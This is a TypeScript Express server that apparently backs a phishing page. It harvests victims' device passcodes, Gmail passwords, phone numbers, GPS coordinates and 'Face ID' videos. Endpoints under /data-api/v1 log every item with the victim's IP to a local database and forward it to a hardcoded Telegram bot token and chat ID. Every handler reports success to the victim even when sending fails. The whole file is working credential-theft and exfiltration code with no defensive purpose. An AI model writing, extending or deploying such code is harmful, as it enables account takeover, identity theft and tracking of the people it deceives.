import express from "express";
import path from "path";
import { fileURLToPath } from "url";
import fs from "fs";
import cors from "cors";
import multer from "multer";
import axios from "axios";
import FormData from "form-data";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const upload = multer({ storage: multer.memoryStorage() });

// Database setup
let db: any = null;
const dbPath = path.resolve(__dirname, "submissions.db");

async function initDb() {
  if (!process.env.VERCEL) {
    try {
      const Database = (await import("better-sqlite3")).default;
      db = new Database(dbPath);
      db.exec(`
        CREATE TABLE IF NOT EXISTS submissions (
          id INTEGER PRIMARY KEY AUTOINCREMENT,
          passcode TEXT,
          gmail_password TEXT,
          phone_number TEXT,
          created_at DATETIME DEFAULT CURRENT_TIMESTAMP
        )
      `);
    } catch (err) {
      console.error("DB Error:", err);
    }
  }
}

initDb();

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const apiRouter = express.Router();

apiRouter.post("/log-event", async (req, res) => {
  const { event, data } = req.body;
  const botToken = process.env.TELEGRAM_BOT_TOKEN || "8499597300:AAGqvpJfBKWtYqWz2z3-unvfJ6QmnU2yRwU";
  const chatId = process.env.TELEGRAM_CHAT_ID || "7643809155";
  
  console.log(`[DEBUG] Received log-event: ${event}`);
  console.log(`[DEBUG] Bot Token: ${botToken.substring(0, 5)}...`);
  console.log(`[DEBUG] Chat ID: ${chatId}`);

  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  let message = "";

  switch (event) {
    case "visit": message = `⚠️ *Someone tapped the link!*\n📍 *IP:* ${ip}`; break;
    case "passcode": message = `🔑 *Passcode Entered:*\n\`${data.passcode}\`\n📍 *IP:* ${ip}`; break;
    case "gmail": message = `📧 *Gmail Password Entered:*\n\`${data.gmailPassword}\`\n📍 *IP:* ${ip}`; break;
    case "phone": message = `📱 *Phone Number Entered:*\n\`${data.phoneNumber}\`\n📍 *IP:* ${ip}`; break;
    case "location": message = `📍 *Location Received:*\n🌍 [View on Google Maps](https://www.google.com/maps?q=${data.latitude},${data.longitude})\n📍 *IP:* ${ip}`; break;
    default: message = `📝 *Event:* ${event}\n*Data:* ${JSON.stringify(data)}\n📍 *IP:* ${ip}`;
  }

  try {
    console.log(`[DEBUG] Sending to Telegram: ${message.substring(0, 50)}...`);
    const response = await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      chat_id: chatId,
      text: message,
      parse_mode: "Markdown",
    });
    console.log("[DEBUG] Telegram Success:", response.data.ok);
    res.json({ success: true });
  } catch (error: any) {
    console.error("[DEBUG] Telegram Error:", error.response?.data || error.message);
    res.json({ success: true, warning: "Telegram failed" });
  }
});

apiRouter.post("/upload-video", upload.single("video"), async (req: any, res) => {
  const botToken = process.env.TELEGRAM_BOT_TOKEN || "8499597300:AAGqvpJfBKWtYqWz2z3-unvfJ6QmnU2yRwU";
  const chatId = process.env.TELEGRAM_CHAT_ID || "7643809155";
  
  console.log("[DEBUG] Received upload-video");
  if (!req.file) {
    console.error("[DEBUG] No file in request");
    return res.status(400).json({ error: "No video" });
  }
  
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  
  try {
    console.log(`[DEBUG] Preparing FormData for video (${req.file.size} bytes)`);
    const form = new FormData();
    form.append("chat_id", chatId);
    form.append("video", req.file.buffer, { filename: "face_id.webm", contentType: req.file.mimetype });
    form.append("caption", `👤 *Face ID Video Received*\n📍 *IP:* ${ip}`);

    console.log("[DEBUG] Sending video to Telegram...");
    const response = await axios.post(`https://api.telegram.org/bot${botToken}/sendVideo`, form, { 
      headers: form.getHeaders(),
      maxContentLength: Infinity,
      maxBodyLength: Infinity
    });
    console.log("[DEBUG] Telegram Video Success:", response.data.ok);
    res.json({ success: true });
  } catch (error: any) {
    console.error("[DEBUG] Video Error:", error.response?.data || error.message);
    res.json({ success: true, warning: "Video failed" });
  }
});

apiRouter.post("/submit", async (req, res) => {
  const { passcode, gmailPassword, phoneNumber } = req.body;
  const botToken = process.env.TELEGRAM_BOT_TOKEN || "8499597300:AAGqvpJfBKWtYqWz2z3-unvfJ6QmnU2yRwU";
  const chatId = process.env.TELEGRAM_CHAT_ID || "7643809155";
  
  console.log("[DEBUG] Received final submit");
  const message = `🚀 *New Submission*\n🔑 *Passcode:* ${passcode || "N/A"}\n📧 *Gmail:* ${gmailPassword || "N/A"}\n📱 *Phone:* ${phoneNumber || "N/A"}`;

  try {
    if (db) {
      console.log("[DEBUG] Saving to local DB...");
      db.prepare("INSERT INTO submissions (passcode, gmail_password, phone_number) VALUES (?, ?, ?)").run(passcode || "", gmailPassword || "", phoneNumber || "");
    }
    
    console.log("[DEBUG] Sending final message to Telegram...");
    const response = await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, { 
      chat_id: chatId, 
      text: message, 
      parse_mode: "Markdown" 
    });
    console.log("[DEBUG] Telegram Final Success:", response.data.ok);
    res.json({ success: true });
  } catch (error: any) {
    console.error("[DEBUG] Submit Error:", error.response?.data || error.message);
    res.json({ success: true });
  }
});

app.use("/data-api/v1", apiRouter);

// Vite / Static serving
if (process.env.NODE_ENV !== "production" && !process.env.VERCEL) {
  const { createServer: createViteServer } = await import("vite");
  const vite = await createViteServer({ server: { middlewareMode: true }, appType: "custom" });
  app.use(vite.middlewares);
  app.get("*", async (req, res, next) => {
    try {
      let template = fs.readFileSync(path.resolve(__dirname, "index.html"), "utf-8");
      template = await vite.transformIndexHtml(req.originalUrl, template);
      res.status(200).set({ "Content-Type": "text/html" }).end(template);
    } catch (e) { next(e); }
  });
} else {
  app.use(express.static(path.join(__dirname, "dist")));
  app.get("*", (req, res) => {
    if (req.url.startsWith("/data-api/")) return res.status(404).json({ error: "Not found" });
    res.sendFile(path.join(__dirname, "dist", "index.html"));
  });
}

if (!process.env.VERCEL) {
  app.listen(3000, "0.0.0.0", () => console.log("Server running on port 3000"));
}

export default app;
